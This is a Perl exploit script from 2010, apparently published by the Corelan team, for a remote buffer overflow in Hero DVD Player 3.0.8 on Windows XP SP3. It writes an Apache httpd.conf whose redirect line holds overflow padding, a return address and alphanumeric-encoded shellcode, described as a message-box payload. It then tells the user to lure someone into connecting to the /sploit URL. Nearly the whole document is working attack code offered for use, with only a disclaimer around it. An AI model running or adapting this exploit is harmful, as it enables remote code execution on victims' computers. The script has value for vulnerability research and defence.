# Exploit Title : Hero DVD Remote Buffer Overflow Exploit
# Date          : July 7, 2010
# Author        : chap0 [www.seek-truth.net]
# Software Link : http://download.cnet.com/Hero-DVD-Player/3000-7970_4-10127412.html
# Version       : 3.0.8
# OS            : Windows XP SP3 
# Greetz to     : God the Creator, Sud0 (Thanks Bro for the Support)
# The Crew	: http://www.corelan.be:8800/index.php/security/corelan-team-members/
# Advisory	: http://www.corelan.be:8800/advisories.php?id=CORELAN-10-056
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[*] Hero DVD Player Remote Exploit by chap0.\n"; 
print "[*] Visit Corelan.be port 8800, Preparing Payload . . .\n";
sleep(3);

my $file = "httpd.conf";

$code = "Redirect permanent /sploit http://";
$junk = "A" x 128;
$more = "yH2X" ; # alpha value for "yH2X" = 0x58324879 from msg723.acm
$nops = "\x42" x 24; #Padding
#message box code
$shell = "TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIN9JKMK9IRTWTL401N2OB2ZVQXISTLKBQ6PLKRVDLLKT65LLKPF5XLKSNWPLKWFWH0OUHRUL3PYEQ8QKOKQSPLKRLGT7TLKQUGLLK645URX5QKZLKQZ28LKPZQ0EQZKKSVW79LKGDLKEQJNVQKOP1IPKLNLK4O03DUZO1HOTM5QYWKYJQKOKOKO7K3LVD18D59NLKPZVDS1JKU6LKTLPKLK1J5L5QZKLK34LKUQKXMYQTWT5L3QHCNRTHGYN4K9KUMYIRE8LNPNTNZLPRKXMLKOKOKOMYPE5TOKSNYHKRBSMW5L14QBKXLKKOKOKOMYQUS83XBLBLGPKOSX6SP2FNE4SXRUT33U3BLHQL14UZLIJFPVKO65TDLIO20POKOXORPMOLMWEL7TPRKX1NKOKOKO3XSBSUD7V8E8BLSQRNW3U8QSRO2RCUVQ9KMXQLWT4KMYM3U82TU8687PSXWPQDRRD5RH0SRESUBK6Q9YLHPL145ZLIM1VQN2F2PSV1PRKOHPP1O060KO0UUXTJA";

open(FILE,">$file");
print FILE $code.$junk.$more.$nops.$shell;
close(FILE);

print "[*] Use Backtrack! place httpd.conf in /etc/apache2/ and start apache.\n";
print "[*] Have Someone Connect to your Server /sploit.\n";  